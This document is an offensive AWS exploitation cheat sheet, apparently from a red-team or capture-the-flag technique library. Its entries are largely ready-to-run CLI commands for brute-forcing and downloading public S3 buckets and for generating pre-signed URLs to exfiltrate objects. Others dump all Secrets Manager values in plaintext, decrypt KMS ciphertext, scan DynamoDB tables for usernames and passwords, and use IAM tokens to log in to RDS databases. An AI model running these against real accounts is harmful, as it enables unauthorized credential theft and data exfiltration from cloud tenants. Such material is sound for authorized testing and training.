# AWS S3 & Secrets Manager Exploitation

### S3 Public Bucket Enumeration & Data Access [added: 2026-04]
- **Tags:** #AWS #S3 #PublicBucket #ACL #BucketPolicy #DataExfil #BucketFinder #AnonymousAccess
- **Trigger:** Discovered S3 bucket names during recon (subdomains, source code, error messages) or have authenticated S3 access
- **Prereq:** Bucket name (for unauthenticated) or `s3:ListBucket` + `s3:GetObject` permissions (for authenticated)
- **Yields:** Exposed files, credentials, backups, PII, and application data from misconfigured buckets
- **Opsec:** Low
- **Context:** Buckets may be misconfigured with public ACLs or bucket policies allowing anonymous access
- **Payload/Method:**
  ```bash
  # List all buckets (authenticated)
  aws s3api list-buckets

  # Check bucket ACL and policy
  aws s3api get-bucket-acl --bucket <name>
  aws s3api get-bucket-policy --bucket <name>
  aws s3api get-public-access-block --bucket <name>

  # List objects
  aws s3api list-objects --bucket <name>
  aws s3 ls s3://<bucket-name> --recursive

  # Anonymous access check (no creds)
  curl https://<bucket-name>.s3.amazonaws.com/
  curl https://<bucket-name>.s3.amazonaws.com/secret.txt

  # Bucket finder brute-force
  ./bucket_finder.rb wordlist.txt --region us
  ./bucket_finder.rb --download wordlist.txt  # download all public files
  ```

### S3 Pre-Signed URL Generation (Bypass ACLs with Temp Access) [added: 2026-04]
- **Tags:** #AWS #S3 #PreSignedURL #ACLBypass #TemporaryAccess #ObjectSharing #S3Presign
- **Trigger:** Object is not publicly accessible but you have authenticated S3 access and need to share or exfil data
- **Prereq:** Valid AWS credentials with `s3:GetObject` permission on the target object
- **Yields:** Time-limited URL granting unauthenticated access to the S3 object
- **Opsec:** Low
- **Context:** Object not publicly accessible but you have authenticated access — generate time-limited URL
- **Payload/Method:**
  ```bash
  aws s3 presign s3://<bucket>/<object> --expires-in 3600
  # Share URL — valid without AWS creds for duration
  ```

### S3 Object ACL Check [added: 2026-04]
- **Tags:** #AWS #S3 #ObjectACL #Permissions #AccessControl #BucketAudit #MisconfigCheck
- **Trigger:** Bucket-level ACL is restrictive but individual objects may have different (weaker) ACLs
- **Prereq:** `s3:GetObjectAcl` permission or public access to the object
- **Yields:** Per-object permission details revealing overly permissive access grants
- **Opsec:** Low
- **Context:** Individual objects may have different ACLs than the bucket
- **Payload/Method:**
  ```bash
  aws s3api get-object-acl --bucket <name> --key <object_key>
  ```

### SecretManager Full Dump (Authenticated) [added: 2026-04]
- **Tags:** #AWS #SecretsManager #CredentialHarvest #SecretDump #GetSecretValue #APIKeys #DBPasswords
- **Trigger:** Enumerated IAM permissions and found secretsmanager:ListSecrets + GetSecretValue access
- **Prereq:** `secretsmanager:ListSecrets` + `secretsmanager:GetSecretValue` permissions (+ KMS decrypt if custom CMK)
- **Yields:** Plaintext secrets including database passwords, API keys, OAuth tokens, and service credentials
- **Opsec:** Med
- **Context:** Have `secretsmanager:ListSecrets` + `GetSecretValue` — full credential harvest
- **Payload/Method:**
  ```bash
  # List all secrets
  aws secretsmanager list-secrets

  # Get secret metadata (includes KMS key ID)
  aws secretsmanager describe-secret --secret-id <name>

  # Dump plaintext value
  aws secretsmanager get-secret-value --secret-id <name>
  # Returns plaintext — no decryption needed, service handles it transparently

  # Check who can access the secret
  aws secretsmanager get-resource-policy --secret-id <ID>
  ```

### KMS Key Exploitation — Decrypt Encrypted Files [added: 2026-04]
- **Tags:** #AWS #KMS #Decrypt #EncryptionBypass #KeyPolicy #CMK #DataDecryption #CiphertextBlob
- **Trigger:** Found encrypted S3 objects or data and have kms:Decrypt permission
- **Prereq:** `kms:Decrypt` permission + access to the encrypted ciphertext blob + key policy allows your principal
- **Yields:** Decrypted plaintext of encrypted files (credentials, sensitive data, backups)
- **Opsec:** Med
- **Context:** Have access to an encrypted S3 file and `kms:Decrypt` permission
- **Payload/Method:**
  ```bash
  # List available keys
  aws kms list-keys
  aws kms describe-key --key-id <id>

  # See who can use the key
  aws kms list-key-policies --key-id <ID>
  aws kms get-key-policy --policy-name default --key-id <ID>

  # Decrypt ciphertext (key info embedded in ciphertext blob)
  aws kms decrypt --ciphertext-blob fileb://EncryptedFile \
    --output text --query Plaintext | base64 -d
  ```

### DynamoDB Data Exfiltration [added: 2026-04]
- **Tags:** #AWS #DynamoDB #DataExfil #NoSQL #TableDump #DatabaseExploit #LocalStack
- **Trigger:** Found DynamoDB tables via enumeration or exposed DynamoDB endpoint (LocalStack, HackTheBox)
- **Prereq:** `dynamodb:ListTables` + `dynamodb:Scan` permissions or access to exposed DynamoDB endpoint
- **Yields:** Full table contents including usernames, passwords, PII, and application data
- **Opsec:** Med
- **Context:** Exposed or misconfigured DynamoDB endpoint (e.g., local stack, HackTheBox)
- **Payload/Method:**
  ```bash
  # List tables
  aws --endpoint-url http://<target> dynamodb list-tables

  # Dump table contents
  aws --endpoint-url http://<target> dynamodb scan --table-name users | \
    jq -r '.Items[] | {username: .username.S, password: .password.S}'
  ```

### RDS IAM Token Authentication Attack [added: 2026-04]
- **Tags:** #AWS #RDS #IAMAuth #DatabaseAccess #TokenAuth #MySQL #PostgreSQL #DBCredential
- **Trigger:** Discovered RDS instance with IAM authentication enabled and have rds-db:connect permission
- **Prereq:** `rds:DescribeDBInstances` + `rds-db:connect` permission + RDS instance with IAM auth enabled
- **Yields:** Database access via temporary IAM-generated auth token (valid 15 minutes)
- **Opsec:** Med
- **Context:** RDS instance has IAM authentication enabled — generate temp token to login
- **Payload/Method:**
  ```bash
  # Check if IAM auth is enabled
  aws rds describe-db-instances | jq '.[] | .IAMDatabaseAuthenticationEnabled'

  # Generate auth token
  TOKEN=$(aws rds generate-db-auth-token \
    --hostname <db-hostname> --port 3306 \
    --username <db-user> --region us-east-1)

  # Connect
  mysql -h <hostname> -u <user> -P 3306 \
    --enable-cleartext-plugin --password="$TOKEN"
  ```
